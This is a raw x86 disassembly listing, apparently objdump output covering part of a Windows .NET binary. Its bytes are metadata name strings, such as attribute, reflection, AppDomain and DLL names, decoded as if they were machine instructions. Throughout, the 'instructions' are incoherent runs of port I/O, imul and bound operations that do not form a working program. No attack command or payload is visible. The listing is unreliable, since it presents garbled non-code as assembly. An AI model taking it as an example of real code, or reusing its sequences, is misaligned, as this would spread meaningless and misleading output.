  40803b:	outs   dx,BYTE PTR ds:[esi]
  40803c:	outs   dx,WORD PTR ds:[esi]
  40803e:	jb     0x4080ad
  408040:	popa   
  408041:	je     0x4080ac
  408043:	outs   dx,DWORD PTR ds:[esi]
  408044:	outs   dx,BYTE PTR ds:[esi]
  408045:	popa   
  408046:	ins    BYTE PTR es:[edi],dx
  408047:	push   esi
  408048:	gs jb  0x4080be
  40804b:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  408052:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  408059:	popa   
  40805a:	je     0x4080c1
  40805c:	ins    BYTE PTR es:[edi],dx
  40805d:	ins    BYTE PTR es:[edi],dx
  40805e:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  408066:	popa   
  408067:	arpl   WORD PTR [esi+edx*2+0x65],si
  40806b:	jb     0x4080e0
  40806d:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  408074:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  40807b:	gs jne 0x4080f2
  40807e:	jb     0x4080e1
  408080:	ins    BYTE PTR es:[edi],dx
  408081:	push   edx
  408082:	gs jae 0x4080f4
  408085:	jne    0x4080f9
  408087:	arpl   WORD PTR [ebp+0x73],sp
  40808a:	dec    esp
  40808b:	popa   
  40808c:	outs   dx,BYTE PTR ds:[esi]
  40808d:	addr16 jne 0x4080f1
  408090:	addr16 gs inc ecx
  408093:	je     0x408109
  408095:	jb     0x408100
  408097:	bound  esi,QWORD PTR [ebp+0x74]
  40809a:	add    BYTE PTR gs:[ecx+0x73],al
  40809e:	jae    0x408105
  4080a0:	ins    DWORD PTR es:[edi],dx
  4080a1:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4080a5:	gs ins BYTE PTR es:[edi],dx
  4080a7:	popa   
  4080a8:	jns    0x4080fd
  4080aa:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  4080b1:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4080b8:	jae    0x40812d
  4080ba:	gs ins DWORD PTR es:[edi],dx
  4080bc:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  4080c0:	gs jns 0x408109
  4080c3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4080cb:	bound  esi,QWORD PTR [ebp+0x74]
  4080ce:	add    BYTE PTR gs:[ebx+0x79],dl
  4080d2:	jae    0x408148
  4080d4:	gs ins DWORD PTR es:[edi],dx
  4080d6:	cs inc esp
  4080d8:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  4080df:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  4080e6:	jne    0x40814f
  4080e8:	addr16 popa 
  4080ea:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4080ee:	je     0x408164
  4080f0:	jb     0x40815b
  4080f2:	bound  esi,QWORD PTR [ebp+0x74]
  4080f5:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4080fa:	jne    0x408163
  4080fc:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  408104:	jae    0x408106
  408106:	push   ebx
  408107:	jns    0x40817c
  408109:	je     0x408170
  40810b:	ins    DWORD PTR es:[edi],dx
  40810c:	cs push edx
  40810e:	jne    0x40817e
  408110:	je     0x40817b
  408112:	ins    DWORD PTR es:[edi],dx
  408113:	gs cs inc ebx
  408116:	outs   dx,DWORD PTR ds:[esi]
  408117:	ins    DWORD PTR es:[edi],dx
  408118:	jo     0x408183
  40811a:	ins    BYTE PTR es:[edi],dx
  40811b:	gs jb  0x408171
  40811e:	gs jb  0x408197
  408121:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  408128:	ins    DWORD PTR es:[edi],dx
  408129:	jo     0x408194
  40812b:	ins    BYTE PTR es:[edi],dx
  40812c:	popa   
  40812d:	je     0x408198
  40812f:	outs   dx,DWORD PTR ds:[esi]
  408130:	outs   dx,BYTE PTR ds:[esi]
  408131:	push   edx
  408132:	gs ins BYTE PTR es:[edi],dx
  408134:	popa   
  408135:	js     0x408198
  408137:	je     0x4081a2
  408139:	outs   dx,DWORD PTR ds:[esi]
  40813a:	outs   dx,BYTE PTR ds:[esi]
  40813b:	jae    0x40817e
  40813d:	je     0x4081b3
  40813f:	jb     0x4081aa
  408141:	bound  esi,QWORD PTR [ebp+0x74]
  408144:	add    BYTE PTR gs:[edx+0x75],dl
  408148:	outs   dx,BYTE PTR ds:[esi]
  408149:	je     0x4081b4
  40814b:	ins    DWORD PTR es:[edi],dx
  40814c:	gs inc ebx
  40814e:	outs   dx,DWORD PTR ds:[esi]
  40814f:	ins    DWORD PTR es:[edi],dx
  408150:	jo     0x4081b3
  408152:	je     0x4081bd
  408154:	bound  ebp,QWORD PTR [ecx+0x6c]
  408157:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  40815f:	bound  esi,QWORD PTR [ebp+0x74]
  408162:	add    BYTE PTR gs:[ecx+edi*2+0x70],dl
  408167:	add    BYTE PTR gs:[edx+0x75],dl
  40816b:	outs   dx,BYTE PTR ds:[esi]
  40816c:	je     0x4081d7
  40816e:	ins    DWORD PTR es:[edi],dx
  40816f:	gs push esp
  408171:	jns    0x4081e3
  408173:	gs dec eax
  408175:	popa   
  408176:	outs   dx,BYTE PTR ds:[esi]
  408177:	fs ins BYTE PTR es:[edi],dx
  408179:	add    BYTE PTR gs:[edi+0x65],al
  40817d:	je     0x4081d3
  40817f:	jns    0x4081f1
  408181:	gs inc esi
  408183:	jb     0x4081f4
  408185:	ins    DWORD PTR es:[edi],dx
  408186:	dec    eax
  408187:	popa   
  408188:	outs   dx,BYTE PTR ds:[esi]
  408189:	fs ins BYTE PTR es:[edi],dx
  40818b:	add    BYTE PTR gs:[edi+0x65],al
  40818f:	je     0x4081d2
  408191:	jae    0x408206
  408193:	gs ins DWORD PTR es:[edi],dx
  408195:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  408199:	push   ebx
  40819a:	je     0x40820e
  40819c:	imul   ebp,DWORD PTR [esi+0x67],0x6e6f4300
  4081a3:	arpl   WORD PTR [ecx+0x74],sp
  4081a6:	add    BYTE PTR [ecx+0x70],al
  4081a9:	jo     0x408217
  4081ab:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4081b2:	inc    ebp
  4081b3:	js     0x408218
  4081b5:	gs jo  0x40822c
  4081b8:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  4081bf:	je     0x408226
  4081c1:	ins    DWORD PTR es:[edi],dx
  4081c2:	cs inc edi
  4081c4:	ins    BYTE PTR es:[edi],dx
  4081c5:	outs   dx,DWORD PTR ds:[esi]
  4081c6:	bound  esp,QWORD PTR [ecx+0x6c]
  4081c9:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4081d0:	add    BYTE PTR [ebx+0x75],al
  4081d3:	ins    BYTE PTR es:[edi],dx
  4081d4:	je     0x40824b
  4081d6:	jb     0x40823d
  4081d8:	dec    ecx
  4081d9:	outs   dx,BYTE PTR ds:[esi]
  4081da:	outs   dx,WORD PTR ds:[esi]
  4081dc:	add    BYTE PTR [esi+0x6f],al
  4081df:	jb     0x40824e
  4081e1:	popa   
  4081e2:	je     0x4081e4
  4081e4:	push   ebx
  4081e5:	jns    0x40825a
  4081e7:	je     0x40824e
  4081e9:	ins    DWORD PTR es:[edi],dx
  4081ea:	cs dec ecx
  4081ec:	dec    edi
  4081ed:	add    BYTE PTR [esi+0x69],al
  4081f0:	ins    BYTE PTR es:[edi],dx
  4081f1:	gs dec ecx
  4081f3:	outs   dx,BYTE PTR ds:[esi]
  4081f4:	outs   dx,WORD PTR ds:[esi]
  4081f6:	add    BYTE PTR [esi+0x69],al
  4081f9:	ins    BYTE PTR es:[edi],dx
  4081fa:	gs push ebx
  4081fc:	jns    0x408271
  4081fe:	je     0x408265
  408200:	ins    DWORD PTR es:[edi],dx
  408201:	dec    ecx
  408202:	outs   dx,BYTE PTR ds:[esi]
  408203:	outs   dx,WORD PTR ds:[esi]
  408205:	add    BYTE PTR [edi+0x65],ah
  408208:	je     0x408269
  40820a:	inc    esi
  40820b:	jne    0x408279
  40820d:	ins    BYTE PTR es:[edi],dx
  40820e:	dec    esi
  40820f:	popa   
  408210:	ins    DWORD PTR es:[edi],dx
  408211:	add    BYTE PTR gs:[edi+0x65],ah
  408215:	je     0x408276
  408217:	dec    ecx
  408218:	outs   dx,BYTE PTR ds:[esi]
  408219:	jbe    0x40827c
  40821b:	jb     0x408286
  40821d:	popa   
  40821e:	outs   dx,BYTE PTR ds:[esi]
  40821f:	je     0x408264
  408221:	jne    0x40828f
  408223:	je     0x40829a
  408225:	jb     0x40828c
  408227:	add    BYTE PTR [ebx+0x6f],al
  40822a:	ins    DWORD PTR es:[edi],dx
  40822b:	jo     0x40828e
  40822d:	jb     0x408294
  40822f:	add    BYTE PTR [eax+0x61],dl
  408232:	je     0x40829c
  408234:	add    BYTE PTR [edi+0x65],al
  408237:	je     0x40827d
  408239:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  408240:	jns    0x408290
  408242:	popa   
  408243:	ins    DWORD PTR es:[edi],dx
  408244:	add    BYTE PTR gs:[ecx+ebp*2+0x72],al
  408249:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  40824e:	jns    0x408250
  408250:	inc    ebp
  408251:	js     0x4082bc
  408253:	jae    0x4082c9
  408255:	jae    0x408257
  408257:	inc    esp
  408258:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40825f:	jns    0x4082aa
  408261:	outs   dx,BYTE PTR ds:[esi]
  408262:	outs   dx,WORD PTR ds:[esi]
  408264:	add    BYTE PTR [ebx+0x72],al
  408267:	gs popa 
  408269:	je     0x4082d0
  40826b:	inc    esp
  40826c:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  408273:	jns    0x408275
  408275:	inc    ebp
  408276:	outs   dx,BYTE PTR ds:[esi]
  408277:	jbe    0x4082e2
  408279:	jb     0x4082ea
  40827b:	outs   dx,BYTE PTR ds:[esi]
  40827c:	ins    DWORD PTR es:[edi],dx
  40827d:	outs   dx,BYTE PTR gs:[esi]
  40827f:	je     0x408281
  408281:	addr16 gs je 0x4082e4
  408285:	inc    ebx
  408286:	jne    0x4082fa
  408288:	jb     0x4082ef
  40828a:	outs   dx,BYTE PTR ds:[esi]
  40828b:	je     0x4082d1
  40828d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  408294:	jns    0x408296
  408296:	addr16 gs je 0x4082f9
  40829a:	dec    esp
  40829b:	outs   dx,BYTE PTR gs:[esi]
  40829d:	addr16 je 0x408308
  4082a0:	add    BYTE PTR [ebx+0x65],dh
  4082a3:	je     0x408304
  4082a5:	inc    ebx
  4082a6:	jne    0x40831a
  4082a8:	jb     0x40830f
  4082aa:	outs   dx,BYTE PTR ds:[esi]
  4082ab:	je     0x4082f1
  4082ad:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4082b4:	jns    0x4082b6
  4082b6:	inc    ecx
  4082b7:	jo     0x408329
  4082b9:	inc    esp
  4082ba:	outs   dx,DWORD PTR ds:[esi]
  4082bb:	ins    DWORD PTR es:[edi],dx
  4082bc:	popa   
  4082bd:	imul   ebp,DWORD PTR [esi+0x53],0x70757465
  4082c4:	add    BYTE PTR [ebx+0x65],dh
  4082c7:	je     0x408328
  4082c9:	inc    ecx
  4082ca:	jo     0x40833c
  4082cc:	ins    BYTE PTR es:[edi],dx
  4082cd:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4082d4:	inc    edx
  4082d5:	popa   
  4082d6:	jae    0x40833d
  4082d8:	add    BYTE PTR [ecx+0x70],al
  4082db:	jo     0x408321
  4082dd:	outs   dx,DWORD PTR ds:[esi]
  4082de:	ins    DWORD PTR es:[edi],dx
  4082df:	popa   
  4082e0:	imul   ebp,DWORD PTR [esi+0x0],0x74737953
  4082e7:	gs ins DWORD PTR es:[edi],dx
  4082e9:	cs push ebx
  4082eb:	arpl   WORD PTR gs:[ebp+0x72],si
  4082ef:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x696c6f50
  4082f7:	arpl   WORD PTR [ecx+0x0],di
  4082fa:	inc    ebp
  4082fb:	jbe    0x408366
  4082fd:	fs outs dx,BYTE PTR gs:[esi]
  408300:	arpl   WORD PTR [ebp+0x0],sp
  408303:	inc    ebx
  408304:	jb     0x40836b
  408306:	popa   
  408307:	je     0x40836e
  408309:	inc    esp
  40830a:	outs   dx,DWORD PTR ds:[esi]
  40830b:	ins    DWORD PTR es:[edi],dx
  40830c:	popa   
  40830d:	imul   ebp,DWORD PTR [esi+0x0],0x5f746567
  408314:	inc    ecx
  408315:	jae    0x40838a
  408317:	gs ins DWORD PTR es:[edi],dx
  408319:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40831d:	inc    ecx
  40831e:	jae    0x408393
  408320:	gs ins DWORD PTR es:[edi],dx
  408322:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  408326:	popa   
  408327:	ins    DWORD PTR es:[edi],dx
  408328:	add    BYTE PTR gs:[edi+0x65],al
  40832c:	je     0x40837c
  40832e:	popa   
  40832f:	ins    DWORD PTR es:[edi],dx
  408330:	add    BYTE PTR gs:[edi+0x65],ah
  408334:	je     0x408395
  408336:	inc    ebx
  408337:	outs   dx,DWORD PTR ds:[esi]
  408338:	fs gs inc edx
  40833b:	popa   
  40833c:	jae    0x4083a3
  40833e:	add    BYTE PTR [ebx+0x79],dl
  408341:	jae    0x4083b7
  408343:	gs ins DWORD PTR es:[edi],dx
  408345:	cs push edx
  408347:	jne    0x4083b7
  408349:	je     0x4083b4
  40834b:	ins    DWORD PTR es:[edi],dx
  40834c:	gs cs push edx
  40834f:	gs ins DWORD PTR es:[edi],dx
  408351:	outs   dx,DWORD PTR ds:[esi]
  408352:	je     0x4083bd
  408354:	outs   dx,BYTE PTR ds:[esi]
  408355:	add    BYTE PTR [bx+0x62],cl
  408359:	push   0x65
  40835b:	arpl   WORD PTR [eax+ecx*2+0x61],si
  40835f:	outs   dx,BYTE PTR ds:[esi]
  408360:	fs ins BYTE PTR es:[edi],dx
  408362:	add    BYTE PTR gs:[ebx+0x72],al
  408366:	gs popa 
  408368:	je     0x4083cf
  40836a:	dec    ecx
  40836b:	outs   dx,BYTE PTR ds:[esi]
  40836c:	jae    0x4083e2
  40836e:	popa   
  40836f:	outs   dx,BYTE PTR ds:[esi]
  408370:	arpl   WORD PTR [ebp+0x46],sp
  408373:	jb     0x4083e4
  408375:	ins    DWORD PTR es:[edi],dx
  408376:	add    BYTE PTR [ebp+0x6e],dl
  408379:	ja     0x4083ed
  40837b:	popa   
  40837c:	jo     0x40837e
  40837e:	push   ebp
  40837f:	outs   dx,BYTE PTR ds:[esi]
  408380:	ins    BYTE PTR es:[edi],dx
  408381:	outs   dx,DWORD PTR ds:[esi]
  408382:	popa   
  408383:	add    BYTE PTR fs:[edi+0x65],ah
  408387:	je     0x4083e8
  408389:	dec    ebp
  40838a:	gs jae 0x408400
  40838d:	popa   
  40838e:	add    BYTE PTR gs:[bx+0x65],al
  408393:	je     0x4083e9
  408395:	jns    0x408407
  408397:	add    BYTE PTR gs:[edi+ebp*2+0x53],dl
  40839c:	je     0x408410
  40839e:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  4083a5:	je     0x40840c
  4083a7:	ins    DWORD PTR es:[edi],dx
  4083a8:	cs push esp
  4083aa:	push   0x64616572
  4083af:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
  4083b6:	gs popa 
  4083b8:	add    BYTE PTR fs:[edi+0x65],ah
  4083bc:	je     0x40841d
  4083be:	inc    ebx
  4083bf:	jne    0x408433
  4083c1:	jb     0x408428
  4083c3:	outs   dx,BYTE PTR ds:[esi]
  4083c4:	je     0x40841a
  4083c6:	push   0x64616572
  4083cb:	add    BYTE PTR [edi+0x65],ah
  4083ce:	je     0x40842f
  4083d0:	inc    ebx
  4083d1:	jne    0x408445
  4083d3:	jb     0x40843a
  4083d5:	outs   dx,BYTE PTR ds:[esi]
  4083d6:	je     0x40842d
  4083d8:	dec    ecx
  4083d9:	inc    ebx
  4083da:	jne    0x408448
  4083dc:	je     0x408453
  4083de:	jb     0x408445
  4083e0:	add    BYTE PTR [edi+0x65],al
  4083e3:	je     0x408428
  4083e5:	outs   dx,DWORD PTR ds:[esi]
  4083e6:	outs   dx,BYTE PTR ds:[esi]
  4083e7:	jae    0x408458
  4083e9:	ins    BYTE PTR es:[edi],dx
  4083ea:	gs inc esi
  4083ec:	popa   
  4083ed:	ins    BYTE PTR es:[edi],dx
  4083ee:	ins    BYTE PTR es:[edi],dx
  4083ef:	bound  esp,QWORD PTR [ecx+0x63]
  4083f2:	imul   edx,DWORD PTR [ebp+0x49],0x43
  4083f6:	jne    0x408464
  4083f8:	je     0x40846f
  4083fa:	jb     0x408461
  4083fc:	add    BYTE PTR [ebx+0x65],dh
  4083ff:	je     0x408460
  408401:	inc    ebx
  408402:	jne    0x408476
  408404:	jb     0x40846b
  408406:	outs   dx,BYTE PTR ds:[esi]
  408407:	je     0x40845e
  408409:	dec    ecx
  40840a:	inc    ebx
  40840b:	jne    0x408479
  40840d:	je     0x408484
  40840f:	jb     0x408476
  408411:	add    BYTE PTR [edi+0x70],cl
  408414:	gs jb  0x408478
  408417:	je     0x408482
  408419:	outs   dx,BYTE PTR ds:[esi]
  40841a:	addr16 push ebx
  40841c:	jns    0x408491
  40841e:	je     0x408485
  408420:	ins    DWORD PTR es:[edi],dx
  408421:	add    BYTE PTR [edi+0x65],ah
  408424:	je     0x408485
  408426:	dec    edi
  408427:	push   ebx
  408428:	push   esi
  408429:	gs jb  0x40849f
  40842c:	imul   ebp,DWORD PTR [edi+0x6e],0x616c5000
  408433:	je     0x40849b
  408435:	outs   dx,DWORD PTR ds:[esi]
  408436:	jb     0x4084a5
  408438:	dec    ecx
  408439:	inc    esp
  40843a:	add    BYTE PTR [edi+0x65],ah
  40843d:	je     0x40849e
  40843f:	push   eax
  408440:	ins    BYTE PTR es:[edi],dx
  408441:	popa   
  408442:	je     0x4084aa
  408444:	outs   dx,DWORD PTR ds:[esi]
  408445:	jb     0x4084b4
  408447:	add    BYTE PTR [ebx+0x6f],al
  40844a:	outs   dx,BYTE PTR ds:[esi]
  40844b:	jae    0x4084bc
  40844d:	ins    BYTE PTR es:[edi],dx
  40844e:	add    BYTE PTR gs:[ebp+0x6e],al
  408452:	arpl   WORD PTR [edi+0x64],bp
  408455:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  40845c:	pop    edi
  40845d:	dec    edi
  40845e:	jne    0x4084d4
  408460:	jo     0x4084d7
  408462:	je     0x4084a9
  408464:	outs   dx,BYTE PTR ds:[esi]
  408465:	arpl   WORD PTR [edi+0x64],bp
  408468:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  40846f:	pop    edi
  408470:	inc    ebx
  408471:	outs   dx,DWORD PTR ds:[esi]
  408472:	fs gs push eax
  408475:	popa   
  408476:	add    BYTE PTR gs:[si+0x65],dl
  40847b:	js     0x4084f1
  40847d:	dec    ecx
  40847e:	outs   dx,BYTE PTR ds:[esi]
  40847f:	outs   dx,WORD PTR ds:[esi]
  408481:	add    BYTE PTR [edi+0x65],ah
  408484:	je     0x4084e5
  408486:	push   esp
  408487:	gs js  0x4084fe
  40848a:	dec    ecx
  40848b:	outs   dx,BYTE PTR ds:[esi]
  40848c:	outs   dx,WORD PTR ds:[esi]
  40848e:	add    BYTE PTR [edi+0x65],ah
  408491:	je     0x4084f2
  408493:	dec    edi
  408494:	inc    ebp
  408495:	dec    ebp
  408496:	inc    ebx
  408497:	outs   dx,DWORD PTR ds:[esi]
  408498:	fs gs push eax
  40849b:	popa   
  40849c:	add    BYTE PTR gs:[bx+0x65],ah
  4084a1:	je     0x408502
  4084a3:	inc    ecx
  4084a4:	dec    esi
  4084a5:	push   ebx
  4084a6:	dec    ecx
  4084a7:	inc    ebx
  4084a8:	outs   dx,DWORD PTR ds:[esi]
  4084a9:	fs gs push eax
  4084ac:	popa   
  4084ad:	add    BYTE PTR gs:[bp+0x69],al
  4084b2:	ins    BYTE PTR es:[edi],dx
  4084b3:	add    BYTE PTR gs:[edi+0x65],ah
  4084b7:	je     0x408518
  4084b9:	inc    ebx
  4084ba:	popa   
  4084bb:	jo     0x40851e
  4084bd:	arpl   WORD PTR [ecx+0x74],bp
  4084c0:	jns    0x4084c2
  4084c2:	inc    ebx
  4084c3:	push   0x53007261
  4084c8:	jo     0x408536
  4084ca:	imul   esi,DWORD PTR [eax+eax*1+0x49],0x3233746e
  4084d2:	add    BYTE PTR [esp+ebp*2+0x6c],al
  4084d6:	dec    ecx
  4084d7:	ins    DWORD PTR es:[edi],dx
  4084d8:	jo     0x408549
  4084da:	jb     0x408550
  4084dc:	inc    ecx
  4084dd:	je     0x408553
  4084df:	jb     0x40854a
  4084e1:	bound  esi,QWORD PTR [ebp+0x74]
  4084e4:	add    BYTE PTR gs:[ebx+0x65],ch
  4084e8:	jb     0x408558
  4084ea:	gs ins BYTE PTR es:[edi],dx
  4084ec:	xor    esi,DWORD PTR [edx]
  4084ee:	cs fs ins BYTE PTR es:[edi],dx
  4084f1:	ins    BYTE PTR es:[edi],dx
  4084f2:	add    BYTE PTR [esi],ch
  4084f4:	arpl   WORD PTR [ebx+0x74],sp
  4084f7:	outs   dx,DWORD PTR ds:[esi]
  4084f8:	jb     0x4084fa
  4084fa:	inc    edx
  4084fb:	outs   dx,DWORD PTR ds:[esi]
  4084fc:	outs   dx,DWORD PTR ds:[esi]
  4084fd:	ins    BYTE PTR es:[edi],dx
  4084fe:	gs popa 
  408500:	outs   dx,BYTE PTR ds:[esi]
  408501:	add    BYTE PTR [edi+ebp*2+0x4c],dl
  408505:	outs   dx,DWORD PTR ds:[esi]
  408506:	ja     0x40856d
  408508:	jb     0x40850a
  40850a:	push   ebx
  40850b:	je     0x40856e
  40850d:	jb     0x408583
  40850f:	jae    0x408568
  408511:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x73627553
  408519:	je     0x40858d
  40851b:	imul   ebp,DWORD PTR [esi+0x67],0x646e4900
  408522:	gs js  0x408574
  408525:	inc    cx
  408527:	outs   dx,BYTE PTR ds:[esi]
  408528:	jns    0x40852a
  40852a:	inc    ecx
  40852b:	jb     0x40859f
  40852d:	popa   
  40852e:	jns    0x408530
  408530:	inc    ebx
  408531:	outs   dx,DWORD PTR ds:[esi]
  408532:	jo     0x4085ad
  408534:	add    BYTE PTR [edi+0x70],ch
  408537:	pop    edi
  408538:	inc    ebp
  408539:	jno    0x4085b0
  40853b:	popa   
  40853c:	ins    BYTE PTR es:[edi],dx
  40853d:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x6c666552
  408545:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40854a:	outs   dx,BYTE PTR ds:[esi]
  40854b:	dec    edi
  40854c:	outs   dx,BYTE PTR ds:[esi]
  40854d:	ins    BYTE PTR es:[edi],dx
  40854e:	jns    0x40859c
  408550:	outs   dx,DWORD PTR ds:[esi]
  408551:	popa   
  408552:	fs inc esi
  408554:	jb     0x4085c5
  408556:	ins    DWORD PTR es:[edi],dx
  408557:	add    BYTE PTR [ebx+0x6f],al
  40855a:	ins    DWORD PTR es:[edi],dx
  40855b:	bound  ebp,QWORD PTR [ecx+0x6e]
  40855e:	add    BYTE PTR gs:[ecx+edi*2+0x70],dl
  408563:	gs dec esp
  408565:	imul   esp,DWORD PTR [edx+0x43],0x65766e6f
  40856c:	jb     0x4085e2
  40856e:	gs jb  0x408571
  408571:	dec    ecx
  408572:	push   esp
  408573:	jns    0x4085e5
  408575:	gs dec esp
  408577:	imul   esp,DWORD PTR [edx+0x43],0x65766e6f
  40857e:	jb     0x4085f4
  408580:	gs jb  0x408583
  408583:	inc    ebx
  408584:	outs   dx,DWORD PTR ds:[esi]
  408585:	outs   dx,BYTE PTR ds:[esi]
  408586:	jbe    0x4085ed
  408588:	jb     0x4085fe
  40858a:	inc    ecx
  40858b:	jae    0x408600
  40858d:	gs ins DWORD PTR es:[edi],dx
  40858f:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  408593:	outs   dx,DWORD PTR ds:[esi]
  408594:	push   esp
  408595:	jns    0x408607
  408597:	gs dec esp
  408599:	imul   esp,DWORD PTR [edx+0x0],0x646441
  4085a0:	inc    ebp
  4085a1:	js     0x408617
  4085a3:	gs jb  0x408614
  4085a6:	popa   
  4085a7:	ins    BYTE PTR es:[edi],dx
  4085a8:	inc    ebp
  4085a9:	js     0x40860e
  4085ab:	gs jo  0x408622
  4085ae:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4085b5:	pop    edi
  4085b6:	inc    ebp
  4085b7:	jb     0x40862b
  4085b9:	outs   dx,DWORD PTR ds:[esi]
  4085ba:	jb     0x4085ff
  4085bc:	outs   dx,DWORD PTR ds:[esi]
  4085bd:	fs add BYTE PTR gs:[ebx+0x4f],al
  4085c2:	dec    ebp
  4085c3:	inc    ebp
  4085c4:	js     0x408629
  4085c6:	gs jo  0x40863d
  4085c9:	imul   ebp,DWORD PTR [edi+0x6e],0x67724100
  4085d0:	jne    0x40863f
  4085d2:	outs   dx,BYTE PTR gs:[esi]
  4085d4:	je     0x40861b
  4085d6:	js     0x40863b
  4085d8:	gs jo  0x40864f
  4085db:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4085e2:	pop    edi
  4085e3:	dec    ecx
  4085e4:	je     0x40864b
  4085e6:	ins    DWORD PTR es:[edi],dx
  4085e7:	add    BYTE PTR [ebx+0x65],dh
  4085ea:	je     0x40864b
  4085ec:	dec    ecx
  4085ed:	je     0x408654
  4085ef:	ins    DWORD PTR es:[edi],dx
  4085f0:	add    BYTE PTR [edi+ebp*2+0x55],dl
  4085f4:	jo     0x408666
  4085f6:	gs jb  0x4085f9
  4085f9:	push   ebp
  4085fa:	dec    ecx
  4085fb:	outs   dx,BYTE PTR ds:[esi]
  4085fc:	je     0x40862f
  4085fe:	add    BYTE PTR ss:[ebp+0x6f],cl
  408602:	fs jne 0x408671
  408605:	add    BYTE PTR gs:[edi+0x65],ah
  408609:	je     0x40866a
  40860b:	dec    ebp
  40860c:	popa   
  40860d:	outs   dx,BYTE PTR ds:[esi]
  40860e:	imul   esp,DWORD PTR [esi+0x65],0x6f4d7473
  408615:	fs jne 0x408684
  408618:	add    BYTE PTR gs:[eax+0x6f],dl
  40861c:	jb     0x408692
  40861e:	popa   
  40861f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x45]
  408623:	js     0x40868a
  408625:	arpl   WORD PTR [ebp+0x74],si
  408628:	popa   
  408629:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4b]
  40862d:	imul   ebp,DWORD PTR [esi+0x64],0x6d490073
  408634:	popa   
  408635:	addr16 gs inc esi
  408638:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69686361
  408640:	outs   dx,BYTE PTR ds:[esi]
  408641:	add    BYTE PTR gs:[edi+0x65],al
  408645:	je     0x408697
  408647:	inc    ebp
  408648:	dec    ebx
  408649:	imul   ebp,DWORD PTR [esi+0x64],0x656c6f00
  408650:	popa   
  408651:	jne    0x4086c7
  408653:	xor    esi,DWORD PTR [edx]
  408655:	cs fs ins BYTE PTR es:[edi],dx
  408658:	ins    BYTE PTR es:[edi],dx
  408659:	add    BYTE PTR [esp+ebp*2+0x62],dh
  40865d:	jb     0x4086c4
  40865f:	data16 cs fs ins BYTE PTR es:[edi],dx
  408663:	ins    BYTE PTR es:[edi],dx
  408664:	add    BYTE PTR [edi+0x75],al
  408667:	imul   esp,DWORD PTR [ecx+eax*2+0x74],0x62697274
  40866f:	jne    0x4086e5
  408671:	add    BYTE PTR gs:[ecx+0x6e],cl
  408675:	je     0x4086dc
  408677:	jb     0x4086df
  408679:	popa   
  40867a:	arpl   WORD PTR [ebp+0x54],sp
  40867d:	jns    0x4086ef
  40867f:	gs inc ecx
  408681:	je     0x4086f7
  408683:	jb     0x4086ee
  408685:	bound  esi,QWORD PTR [ebp+0x74]
  408688:	add    BYTE PTR gs:[ebx+0x6f],al
  40868c:	ins    DWORD PTR es:[edi],dx
  40868d:	dec    ecx
  40868e:	outs   dx,BYTE PTR ds:[esi]
  40868f:	je     0x4086f6
  408691:	jb     0x4086f9
  408693:	popa   
  408694:	arpl   WORD PTR [ebp+0x54],sp
  408697:	jns    0x408709
  408699:	add    BYTE PTR gs:[ebx+0x6f],al
  40869d:	ins    DWORD PTR es:[edi],dx
  40869e:	dec    ecx
  40869f:	ins    DWORD PTR es:[edi],dx
  4086a0:	jo     0x408711
  4086a2:	jb     0x408718
  4086a4:	inc    ecx
  4086a5:	je     0x40871b
  4086a7:	jb     0x408712
  4086a9:	bound  esi,QWORD PTR [ebp+0x74]
  4086ac:	add    BYTE PTR gs:[edi+0x65],ah
  4086b0:	je     0x408711
  4086b2:	inc    ebx
  4086b3:	jne    0x408727
  4086b5:	jb     0x40871c
  4086b7:	outs   dx,BYTE PTR ds:[esi]
  4086b8:	je     0x4086fe
  4086ba:	outs   dx,DWORD PTR ds:[esi]
  4086bb:	ins    DWORD PTR es:[edi],dx
  4086bc:	popa   
  4086bd:	imul   ebp,DWORD PTR [esi+0x0],0x6f736552
  4086c4:	ins    BYTE PTR es:[edi],dx
  4086c5:	jbe    0x40872c
  4086c7:	inc    ebp
  4086c8:	jbe    0x40872f
  4086ca:	outs   dx,BYTE PTR ds:[esi]
  4086cb:	je     0x408715
  4086cd:	popa   
  4086ce:	outs   dx,BYTE PTR ds:[esi]
  4086cf:	fs ins BYTE PTR es:[edi],dx
  4086d1:	gs jb  0x4086d4
